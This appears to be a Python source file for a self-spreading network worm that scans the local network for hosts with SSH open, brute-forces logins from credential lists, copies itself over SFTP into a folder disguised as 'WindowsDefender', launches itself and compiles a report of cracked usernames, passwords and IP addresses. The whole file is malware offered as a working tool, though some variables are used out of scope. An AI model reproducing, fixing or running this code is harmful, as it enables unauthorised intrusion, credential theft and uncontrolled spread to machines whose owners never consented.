#I want to create a script that can automatically share itself over a network of computers using various network protocols like sftp for now

#Useful libraries I would be working with -->
import paramiko
import sys
#import nmap
import socket
import os
from threading import Thread
#from concurrent.futures import ThreadPoolExecutor, as_completed
import ip_info
import config
from multiprocessing.pool import ThreadPool
import network_scanner as lps
import itertools
import random


#Declaring the variables, classes and functions for the script
path_ = os.getcwd().split('\\')[0]
file = os.path.basename(sys.argv[0])
to_path = f"{path_}\\WindowsDefender"

#This class handles the network worm functionalities
class NetworkWorm:
    def __init__(self, port, attacker, target):
        self.attacker = attacker
        self.target = target
        self.username = config.ssh_username()
        self.password = config.ssh_password()
        self.scanner = lps.LAN_Port_Scanner(self.attacker, self.target)
        self.infectionMarker = f"{to_path}\\{file}"
        self.port = port

    #This scans the local network for live hosts on port 22
    def getHostsOnTheSameNetwork(self, privateIP):
        print("Starting to scan all host on current local area network")
        try:
            report_, host = self.scanner.portScan("LAN", self.port)
            #print(f"Report: {report}")
            print(f"Host: {host}")
            host.remove(privateIP)
        except Exception as e:
            print(f"An error occurred when trying to scan for other local networks due to [{e}]")
            host = []
        return host

    #This function checks if a system is already infected or not
    def isInfected(self, ssh):
        infected = False
        try:
            sftpClient = ssh.open_sftp()
            sftpClient.stat(infectionMarker)
            infected = True
        except:
            print("This system is not infected")
        return infected

    #The exploit target system is supposed to be in this section
    def exploitTarget(self, ssh, host):
        print("Expoiting Target System")
        sftpClient = ssh.open_sftp()
        file = os.path.basename(sys.argv[0])
        #ext = file.split(".")
        #copy_ = f"{ext[0]}_copy.{ext[-1]}"
        #os.system(f"copy {file} {copy_}")
        #file_, encFernetKey, stat = self.crypter.encrypter(copy_) #This encrypts the file
        sftpClient.put(file, f"{to_path}\\{file}")
        #file_, stat = self.crypter.decrypter(copy_, encFernetKey)
        os.system(f"start {file}")
        sftpClient.close()
        ssh.close()
        stat = f"> Infected {host} sucessfully!! \n"
        report += stat
        print(stat)

    #This function tries to login to the target system with the given username and password
    def attackSystem(self, hostIP, userName, passWord):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostIP, username = userName, password = passWord)
        return ssh

    #This function loops through all the login credentials to try attack the target system
    def tryCredentials(self, hostIP):
        ssh = False
        for user in self.username:
           for pwd in self.password:
               print(f"Attempting brute force attack on {hostIP} with {user}:{pwd}")
               try:
                    ssh = self.attackSystem(hostIP, user, pwd)
                    if ssh:
                        stat = f"> Successfully cracked {hostIP}:: Username: {user}. Password: {pwd} \n"
                        print()
                        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                        print(stat)
                        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                        print()
                        report += stat
                        return ssh
               except Exception as e:
                    print(f"An error occurred when trying credentials on {hostIP} due to [{e}]")
        stat_ = f"> Brute force attack on {hostIP} wasn't successful \n"
        print(stat_)
        report += stat_
        return ssh

    #This function handles the brute force attack of each available discovered host in the local network
    def networm(self, host):
        print(f"{host} under Observation ...")
        ssh = None
        try:
            ssh = self.tryCredentials(host)  
            if ssh:
                infected = self.isInfected(ssh)
                if not infected:
                    try:
                        self.exploitTarget(ssh, host)
                        ssh.close()
                    except Exception as e:
                        stat = f"> Failed to execute worm on {host} due to [{e}] \n"
                        print(stat)
                        report += stat
                        print("----------------------") 
                else:
                    stat = f"> {host} is already infected \n"
                    report += stat
                    print(stat)
        except socket.error:
            stat = f"> {host} is no longer Up! \n"
            report += stat
            print(stat)
        except paramiko.ssh_exception.AuthenticationException:
            stat = f"> Wrong Credentials for {host} \n"
            report += stat
            print(stat)
        except Exception as e:
            stat = f"> An error occurred in networm function for {host} due to [{e}] \n"
            report += stat
            print(stat)
        
        print("---------------------")


#This function contains the execution of the network worm to the target systems simultaenously
def KageBunshin(port, attacker, target):
    user, host, publicIP, privateIP = ip_info.main() #This function gets the ip address infos of the machine
    if port == 22:
        protocol = "SFTP"
    else:
        protocol = "Unknown"

    report = f"""{'~' * 30} NETWORK WORM REPORT {'~' * 30}

        ~~~ Mission Details ~~~
Attacker: {attacker}
Target: {target}
Username: {user}
Hostname: {host}
Private IP: {privateIP}
Public IP: {publicIP}


        ~~~ Network Worm Details ~~~ \n"""

    net_worm = NetworkWorm(port, attacker, target)
    file = os.path.basename(sys.argv[0])
    print(f'Kage Bunshin No Jutsu!!... Starting to check if it can infect the network with {file}... ')

    #Get all hosts in the network
    discoveredHosts = net_worm.getHostsOnTheSameNetwork(privateIP)
    num = len(discoveredHosts)
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(f"Discovered Host: {discoveredHosts}")
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    #markInfected()

    print()

    #This handles the threading of the all discovered host in the network
    threads = []
    try:
        if discoveredHosts:
            stat = f"Attempting {protocol} Brute Force Attack on the LAN"
            for host in discoveredHosts:
                t1 = Thread(target = net_worm.networm, args = (host, ))
                threads.append(t1)

            for t in threads:
                t.start()

            for t in threads:
                t.join()
        else:
            stat = f"There was no discovered host on the LAN with port {port} open for infection \n"
            report += stat
            print(stat)
    except Exception as e:
        stat = f"An error occured when trying to spread the malware due to {e} \n"
        report += stat
        print(stat)

    #This section would write and send the report to the specified email
    print(f"{'~' * 20} \nReport: {report} \n{'~' * 20}")

    return stat



if __name__ == "__main__":
    #Commencing the code
    print("KAGE BUNSHIN NETWORK WORM \n")

    attacker, target = "Uchiha Minato", "Konoha"
    worm = KageBunshin(22, attacker, target)

    print("\nExecuted successfully!!")
